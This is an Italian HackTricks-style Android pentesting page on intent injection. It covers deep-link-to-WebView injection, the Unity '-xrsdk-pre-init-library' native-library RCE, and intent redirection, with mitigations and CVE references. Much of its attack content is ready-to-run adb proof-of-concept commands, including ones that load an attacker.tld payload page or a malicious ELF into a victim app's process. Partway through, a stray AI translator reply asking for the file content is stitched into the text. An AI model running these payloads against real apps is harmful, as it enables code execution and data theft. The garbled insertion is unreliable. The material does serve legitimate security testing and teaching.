# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection sfrutta componenti che accettano Intents controllati dall'attaccante o dati che vengono successivamente convertiti in Intents. Due schemi molto comuni durante i pentests di app Android sono:

- Passare extras creati ad hoc ad Activities/Services/BroadcastReceivers exported che vengono poi inoltrati a componenti privilegiati non-exported.
- Attivare deep links exported VIEW/BROWSABLE che inoltrano URL controllati dall'attaccante verso WebViews interni o altri sensitive sinks.

## Deep links → WebView sink (URL parameter injection)

Se un'app espone un deep link con scheme personalizzato come:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
e l'Activity ricevente inoltra il parametro di query `url` in una WebView, puoi forzare l'app a renderizzare contenuti remoti arbitrari nel suo contesto WebView.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impatto
- HTML/JS viene eseguito all'interno del profilo WebView dell'app.
- Se JavaScript è abilitato (di default o a causa di controlli eseguiti in ordine errato), puoi enumerare/usare qualsiasi oggetto `@JavascriptInterface` esposto, sottrarre cookie/local storage di WebView e pivot.

Vedi anche:

{{#ref}}
webview-attacks.md
{{#endref}}

## Bug dell'ordine dei controlli che abilita JavaScript

Un bug ricorrente è l'abilitazione di JavaScript (o di altre impostazioni permissive di WebView) prima che la allowlist/verifica finale dell'URL sia completata. Se helper iniziali accettano il tuo deep link e la WebView viene configurata prima, il caricamento finale avviene con JavaScript già abilitato anche se i controlli successivi sono errati o troppo tardi.

Cosa cercare nel codice decompilato:
- Più helper che analizzano/suddividono/ricostruiscono l'URL in modo diverso (normalizzazione inconsistente).
- Chiamate a `getSettings().setJavaScriptEnabled(true)` prima dell'ultima host/path allowlist check.
- Una pipeline come: parse → partial validate → configure WebView → final verify → loadUrl.

Mitigazioni
- Canonicalizza una volta e valida strettamente; fail closed.
- Abilita JavaScript solo dopo che tutti i controlli sono passati e immediatamente prima di caricare contenuti attendibili.
- Evita di esporre bridge verso origini non attendibili.

## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Le app Android basate su Unity tipicamente usano `com.unity3d.player.UnityPlayerActivity` (o `UnityPlayerGameActivity`) come Activity di ingresso. Il template Android di Unity tratta un Intent extra speciale chiamato `unity` come una stringa di flag da linea di comando per il runtime Unity. Quando l'Activity di ingresso è exported (default in molti template), qualsiasi app locale – e talvolta un sito web se è presente `BROWSABLE` – può fornire questo extra.

Un flag pericoloso e non documentato porta all'esecuzione di codice nativo durante la primissima fase di inizializzazione del processo:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Estratto di reverse-engineering (semplificato):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Perché funziona
- L'Intent extra `unity` viene interpretato come flag di runtime di Unity.
- Fornire il flag pre-init indirizza Unity a un percorso ELF controllato dall'attaccante all'interno di un percorso di linker namespace consentito (vedi i vincoli sotto).

Condizioni per lo sfruttamento
- L'Activity di entry di Unity è esportata (comune per default).
- Per exploit remoto con un click via browser: l'Activity di entry dichiara anche `android.intent.category.BROWSABLE` così gli extras possono essere passati da un URL `intent:`.

Sfruttamento locale (stesso dispositivo)
1) Posiziona un payload ELF in un percorso leggibile dall'app vittima. Più semplice: distribuisci una libreria malevola nella tua app attaccante e assicurati che venga estratta sotto `/data/app/.../lib/<abi>/` impostando nel manifest dell'attaccante:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Avvia l'activity di Unity della vittima con il CLI pre-init flag nell'extra `unity`. Esempio di PoC ADB:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; il tuo payload viene eseguito nel processo della vittima, ereditando tutte le autorizzazioni dell'app (camera/mic/network/storage, ecc.) e l'accesso alle sessioni/dati in-app.

Note
- Il percorso esatto `/data/app/...` varia tra dispositivi/installazioni. Un'app dell'attaccante può recuperare la propria directory delle librerie native a runtime tramite `getApplicationInfo().nativeLibraryDir` e comunicarla al trigger.
- Il file non deve necessariamente terminare con `.so` se è un ELF valido – `dlopen()` si basa sugli header ELF, non sulle estensioni.

Remote one‑click via browser (condizionale)
Se l'entry activity di Unity è esportata con `BROWSABLE`, un sito web può passare extras tramite un `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Tuttavia, nelle versioni moderne di Android i dynamic linker namespaces e SELinux impediscono il caricamento da molti percorsi pubblici (es. `/sdcard/Download`). Vedrai errori come:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Strategia di bypass: prendere di mira le app che memorizzano bytes controllati dall'attaccante nella loro area privata (ad esempio, HTTP cache). Poiché i percorsi consentiti includono `/data` e la directory privata dell'app, puntare `-xrsdk-pre-init-library` a un percorso assoluto all'interno della cache dell'app può soddisfare i vincoli del linker e portare all'esecuzione di codice. Questo rispecchia precedenti pattern di cache-to-ELF RCE osservati in altre app Android.


## Altri primitivi classici di Intent injection

- startActivity/sendBroadcast che usano extras di `Intent` forniti dall'attaccante che vengono poi rianalizzati (`Intent.parseUri(...)`) ed eseguiti.
- Componenti proxy esportati che inoltrano Intents a componenti sensibili non-esportati senza controlli di permesso.

---

## Automazione dei test per componenti esportati (Smali-driven ADB generation)

Quando i componenti esportati si aspettano extras specifici, indovinare la forma del payload causa perdita di tempo e falsi negativi. È possibile automatizzare la scoperta di chiavi/tipi direttamente da Smali e generare comandi adb pronti all'esecuzione.

Strumento: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approccio: decompila e scansiona Smali alla ricerca di chiamate come `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` per dedurre quali extras e campi sono consumati da ciascun componente.
- Output: per ogni Activity/Service/Receiver/Provider esportato, lo strumento stampa una breve spiegazione e il comando esatto `adb shell am ...`/`cmd content ...` con flag correttamente tipizzati.

Installa
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Uso
```bash
python apk-components-inspector.py target.apk
```
I don't have the file content. Please paste the contents of src/mobile-pentesting/android-app-pentesting/intent-injection.md here (the full markdown you want translated). I will return the translated Italian version preserving all markdown/html tags, links, paths and code exactly as requested.
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
Cheatsheet ADB am extras (type-aware flags)
- Stringhe: `--es key value` | Array di stringhe: `--esa key v1,v2`
- Interi: `--ei key 123` | Array di interi: `--eia key 1,2,3`
- Booleani: `--ez key true|false`
- Long: `--el key 1234567890`
- Float: `--ef key 1.23`
- URI (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Extra componente: `--ecn key com.pkg/.Cls`
- Extra stringa nulla: `--esn key`
- Flag comuni: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Suggerimenti per i Providers
- Usa `adb shell cmd content query|insert|update|delete ...` per interrogare ContentProviders senza agenti.
- Per il probing SQLi, varia `--projection` e `--where` (aka selection) quando il provider sottostante è basato su SQLite.

Automazione full-pipeline (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Script di supporto (unisce le righe continuate, esegue solo le righe che iniziano con `adb`):
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
Run on-device: the inspector is Python-based and works in Termux or rooted phones where `apktool`/`androguard` are available.

---

## Intent Redirection (CWE-926) – ricerca e sfruttamento

Modello
- Un punto di ingresso esportato (Activity/Service/Receiver) legge un Intent in arrivo e lo inoltra internamente o esternamente senza validare sorgente/dati, es.:
- `startActivity(getIntent())`
- `startActivity(intent)` dove `intent` proviene da un extra come `redirect_intent`/`next_intent`/`pending_intent` o `Intent.parseUri(...)`.
- Affidarsi ai campi `action`/`data`/`component` senza controlli; non verificare l'identità del chiamante.

Cosa cercare in Smali/Java
- Uso di `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Richiami diretti a `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` su Intent controllati dall'attaccante.
- Mancanza di controlli `getCallingPackage()`/`getCallingActivity()` o di gate basati su permission personalizzate.

Template PoC per ADB
- Proxy Activity che inoltra un Intent extra a una Activity interna privilegiata:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Servizio esportato che rispetta un `redirect_intent` di tipo parcelable:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Ricevitore esportato che rilancia senza validazione:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags utili per il comportamento in stile singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Esempi reali (impatto variabile):
- CVE-2024-26131 (Element Android): flussi esportati che portano a manipolazione della WebView, bypass del PIN, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → effetti a livello di sistema.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → accesso arbitrario ai file (con interazione dell'utente).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Mitigazioni (checklist per sviluppatori)
- Non inoltrare direttamente gli Intents in ingresso; sanitizza e ricostruisci solo i campi consentiti.
- Restringi l'esposizione impostando `android:exported="false"` salvo necessità. Proteggi i componenti esportati con permessi e signature.
- Verifica l'identità del caller (`getCallingPackage()`/`getCallingActivity()`), e impone l'uso di Intents espliciti per la navigazione intra-app.
- Valida sia `action` che `data` (scheme/host/path) prima dell'uso; evita `Intent.parseUri` su input non affidabili.

---

## Riferimenti

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
